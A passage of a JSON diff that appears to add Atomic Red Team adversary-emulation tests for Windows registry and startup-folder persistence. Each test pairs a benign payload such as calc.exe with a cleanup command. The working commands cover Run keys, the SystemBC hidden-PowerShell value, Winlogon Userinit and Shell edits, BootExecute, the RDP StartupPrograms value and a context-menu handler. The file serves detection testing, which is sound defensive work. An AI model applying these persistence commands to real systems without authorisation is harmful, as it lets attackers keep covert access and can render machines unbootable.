+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "reg ADD \"HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command\" /ve /d \"calc.exe\" /f",
+                            "cleanup_command": "reg DELETE \"HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\" /f",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "SystemBC Malware-as-a-Service Registry",
+                        "auto_generated_guid": "9dc7767b-30c1-4cc4-b999-50cab5e27891",
+                        "description": "This Atomic will create a registry key called socks5_powershell for persistance access\nhttps://medium.com/walmartglobaltech/systembc-powershell-version-68c9aad0f85c\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "reg_key_value": {
+                                "description": "Thing to Run",
+                                "type": "path",
+                                "default": "powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File"
+                            },
+                            "reg_key_path": {
+                                "description": "Path to registry key to update",
+                                "type": "path",
+                                "default": "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+                            }
+                        },
+                        "executor": {
+                            "command": "$RunKey = \"#{reg_key_path}\"\nSet-ItemProperty -Path $RunKey -Name \"socks5_powershell\" -Value \"#{reg_key_value}\"\n",
+                            "cleanup_command": "Remove-ItemProperty -Path #{reg_key_path} -Name \"socks5_powershell\" -Force -ErrorAction Ignore\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "Change Startup Folder - HKLM Modify User Shell Folders Common Startup Value",
+                        "auto_generated_guid": "acfef903-7662-447e-a391-9c91c2f00f7b",
+                        "description": "This test will modify the HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders -V \"Common Startup\" \nvalue to point to a new startup folder where a payload could be stored to launch at boot.  *successful execution requires system restart\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "new_startup_folder": {
+                                "description": "new startup folder to replace standard one",
+                                "type": "string",
+                                "default": "$env:TMP\\atomictest\\"
+                            },
+                            "payload": {
+                                "description": "executable to be placed in new startup location ",
+                                "type": "string",
+                                "default": "C:\\Windows\\System32\\calc.exe"
+                            }
+                        },
+                        "executor": {
+                            "command": "New-Item -ItemType Directory -path \"#{new_startup_folder}\"\nCopy-Item -path \"#{payload}\" -destination \"#{new_startup_folder}\"\nSet-ItemProperty -Path  \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Common Startup\" -Value \"#{new_startup_folder}\"\n",
+                            "cleanup_command": "Set-ItemProperty -Path  \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Common Startup\" -Value \"%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nRemove-Item \"#{new_startup_folder}\" -Recurse -Force\n",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Change Startup Folder - HKCU Modify User Shell Folders Startup Value",
+                        "auto_generated_guid": "8834b65a-f808-4ece-ad7e-2acdf647aafa",
+                        "description": "This test will modify the HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders  -V \"Startup\" value \nto point to a new startup folder where a payload could be stored to launch at boot.  *successful execution requires system restart\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "new_startup_folder": {
+                                "description": "new startup folder to replace standard one",
+                                "type": "string",
+                                "default": "$env:TMP\\atomictest\\"
+                            },
+                            "payload": {
+                                "description": "executable to be placed in new startup location ",
+                                "type": "string",
+                                "default": "C:\\Windows\\System32\\calc.exe"
+                            }
+                        },
+                        "executor": {
+                            "command": "New-Item -ItemType Directory -path \"#{new_startup_folder}\"\nCopy-Item -path \"#{payload}\" -destination \"#{new_startup_folder}\"\nSet-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Startup\" -Value \"#{new_startup_folder}\"\n",
+                            "cleanup_command": "Set-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Startup\" -Value \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nRemove-Item \"#{new_startup_folder}\" -Recurse -Force\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "HKCU - Policy Settings Explorer Run Key",
+                        "auto_generated_guid": "a70faea1-e206-4f6f-8d9a-67379be8f6f1",
+                        "description": "This test will create a new value under HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run to launch calc.exe on boot. \n*Requires reboot\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "target_key_value_name": {
+                                "description": "registry value to crate on target key",
+                                "type": "string",
+                                "default": "atomictest"
+                            },
+                            "payload": {
+                                "description": "payload to execute",
+                                "type": "string",
+                                "default": "C:\\Windows\\System32\\calc.exe"
+                            }
+                        },
+                        "executor": {
+                            "command": "if (!(Test-Path -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\")){\n  New-Item -ItemType Key -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"\n}\nSet-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"#{target_key_value_name}\" -Value \"#{payload}\"\n",
+                            "cleanup_command": "Remove-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"#{target_key_value_name}\"",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "HKLM - Policy Settings Explorer Run Key",
+                        "auto_generated_guid": "b5c9a9bc-dda3-4ea0-b16a-add8e81ab75f",
+                        "description": "This test will create a HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run key value to launch calc.exe on boot. \n*Requires reboot\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "target_key_value_name": {
+                                "description": "registry value to crate on target key",
+                                "type": "string",
+                                "default": "atomictest"
+                            },
+                            "payload": {
+                                "description": "payload to execute",
+                                "type": "string",
+                                "default": "C:\\Windows\\System32\\calc.exe"
+                            }
+                        },
+                        "executor": {
+                            "command": "if (!(Test-Path -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\")){\n  New-Item -ItemType Key -Path  \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"\n}\nSet-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"#{target_key_value_name}\" -Value \"#{payload}\"\n",
+                            "cleanup_command": "Remove-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"#{target_key_value_name}\"",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "HKLM - Append Command to Winlogon Userinit KEY Value",
+                        "auto_generated_guid": "f7fab6cc-8ece-4ca7-a0f1-30a22fccd374",
+                        "description": "This test will append a command to the  HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit value to launch calc.exe on boot.\n* Requires reboot\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "payload": {
+                                "description": "what to run",
+                                "type": "string",
+                                "default": "C:\\Windows\\System32\\calc.exe"
+                            }
+                        },
+                        "executor": {
+                            "command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\");\nSet-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit-backup\" -Value \"$oldvalue\";\n$newvalue = $oldvalue + \" #{payload}\";\nSet-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\" -Value \"$newvalue\"\n",
+                            "cleanup_command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name 'Userinit-backup');\nSet-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\" -Value \"$oldvalue\";\nRemove-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name 'Userinit-backup'",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "HKLM - Modify default System Shell - Winlogon Shell KEY Value ",
+                        "auto_generated_guid": "1d958c61-09c6-4d9e-b26b-4130314e520e",
+                        "description": "This test change the default value of HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell from \"explorer.exe\" to the full path of \"C:\\Windows\\explorer.exe\" \nto log a change to the key's default value without breaking boot sequence. \nAn atacker will alternatively replace this with a custom shell. \n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "payload": {
+                                "description": "what to run",
+                                "type": "string",
+                                "default": "C:\\Windows\\explorer.exe"
+                            }
+                        },
+                        "executor": {
+                            "command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell\");\nSet-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell-backup\" -Value \"$oldvalue\";\n$newvalue = $oldvalue + \", #{payload}\";\nSet-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell\" -Value \"$newvalue\"\n",
+                            "cleanup_command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name 'Shell-backup');\nSet-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell\" -Value \"$oldvalue\";\nRemove-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name 'Shell-backup'",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "secedit used to create a Run key in the HKLM Hive",
+                        "auto_generated_guid": "14fdc3f1-6fc3-4556-8d36-aa89d9d42d02",
+                        "description": "secedit allows to manipulate the HKLM hive of the Windows registry. This test creates a Run key with the keyname calc having calc.exe as the value in the HKLM hive.\n[Reference](https://blueteamops.medium.com/secedit-and-i-know-it-595056dee53d)\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "ini_file": {
+                                "description": "INI config template",
+                                "type": "string",
+                                "default": "$PathToAtomicsFolder\\T1547.001\\src\\regtemplate.ini"
+                            },
+                            "secedit_db": {
+                                "description": "Custom secedit db",
+                                "type": "string",
+                                "default": "mytemplate.db"
+                            }
+                        },
+                        "executor": {
+                            "command": "secedit /import /db #{secedit_db} /cfg \"#{ini_file}\"\nsecedit /configure /db #{secedit_db}\n",
+                            "cleanup_command": "REG DELETE \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"calc\" /f >nul 2>&1",
+                            "name": "command_prompt",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Modify BootExecute Value",
+                        "auto_generated_guid": "befc2b40-d487-4a5a-8813-c11085fb5672",
+                        "description": "This test modifies the BootExecute registry value to \"autocheck autoche *\", which can be used to simulate an adversary's attempt to tamper with the system's boot process. \nReference - https://www.welivesecurity.com/wp-content/uploads/2018/09/ESET-LoJax.pdf\nNOTE that by not saving the correct value, you may inhibit your system from booting properly. Only run on a test system. There is a reg export before running the Atomic.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "registry_value": {
+                                "description": "Registry value to set",
+                                "type": "string",
+                                "default": "autocheck autoche *"
+                            }
+                        },
+                        "executor": {
+                            "command": "if (!(Test-Path \"$PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg\")) { reg.exe export \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\" \"$PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg\" /y }\nSet-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\" -Name \"BootExecute\" -Value \"#{registry_value}\" -Type MultiString\n",
+                            "cleanup_command": "reg.exe import \"$PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg\"\nRemove-Item -Path \"$PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg\" -Force\n",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Allowing custom application to execute during new RDP logon session",
+                        "auto_generated_guid": "b051b3c0-66e7-4a81-916d-e6383bd3a669",
+                        "description": "When a users logs in to a computer via RDP,Windows will search for the key in HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd registry\nBy default, rdpclip is the value stored. An attacker with administrator privileges can alter the value stored to allow for the custom application to execute during RDP login session.The test will allow running cal rather rdpclip when a user logs in via RDP\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "malicious_app": {
+                                "description": "Application to be executed during successful RDP session",
+                                "type": "string",
+                                "default": "calc"
+                            }
+                        },
+                        "executor": {
+                            "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\" /f /v StartupPrograms /t REG_SZ /d \"#{malicious_app}\"\n",
+                            "cleanup_command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\" /f /v StartupPrograms /t REG_SZ /d \"rdpclip\"",
+                            "name": "command_prompt",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Creating Boot Verification Program Key for application execution during successful boot",
+                        "auto_generated_guid": "6e1666d5-3f2b-4b9a-80aa-f011322380d4",
+                        "description": "Microsoft allows users to define a custom boot verification program for those situations by creating the registry key “HKLM\\System\\CurrentControlSet\\Control\\BootVerificationProgram” and setting the value of ImagePath to the path of boot verification program.Threat Actor\ncan abuse by creating this registry key and providing a malicious application to be executed during successful boot\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "malicious_file": {
+                                "description": "Application to be executed during successful boot",
+                                "type": "string",
+                                "default": "C:\\Program Files\\Internet Explorer\\iexplore.exe"
+                            }
+                        },
+                        "executor": {
+                            "command": "reg add HKLM\\System\\CurrentControlSet\\Control\\BootVerificationProgram /v ImagePath /t REG_SZ /d \"#{malicious_file}\"\n",
+                            "cleanup_command": "reg delete HKLM\\System\\CurrentControlSet\\Control\\BootVerificationProgram /f",
+                            "name": "command_prompt",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Add persistence via Windows Context Menu",
+                        "auto_generated_guid": "de47f4a0-2acb-416d-9a6b-cee584a4c4d1",
+                        "description": "This atomic test add persistence taking advantage of the  Windows Context Menu [Hexacorn](https://www.hexacorn.com/blog/2018/07/29/beyond-good-ol-run-key-part-82/)\nUser have to right click on the main screen or in the white space of the opened folder (e.g. Size Modify).\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "reg add \"HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\Size Modify\\command\" /ve /t REG_SZ /d \"C:\\Windows\\System32\\calc.exe\" /f",
+                            "cleanup_command": "reg delete \"HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\Size Modify\" /f",
+                            "name": "command_prompt",
+                            "elevation_required": true
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 15:36:17"
+}
